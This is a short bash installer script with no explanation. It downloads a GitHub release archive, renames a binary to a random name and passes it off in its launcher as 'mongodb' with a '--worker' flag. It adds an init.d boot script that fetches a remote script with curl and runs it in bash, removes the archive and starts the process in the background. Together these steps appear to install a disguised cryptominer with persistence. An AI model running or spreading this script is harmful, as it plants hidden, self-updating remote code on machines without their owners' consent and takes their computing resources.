cd /
wget https://github.com/entropycx/gravity/releases/download/v1.5.0/kinetic.tar
tar -xvf kinetic.tar
cd /kinetic
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv sakato $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./relativity.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/entropycx/gravity/main/quantum.sh)" > momentum.sh
chmod a+x momentum.sh
update-rc.d momentum.sh defaults
rm -rf kinetic.tar
cd /kinetic
nohup ./relativity.sh
ps -ef | grep kinetic
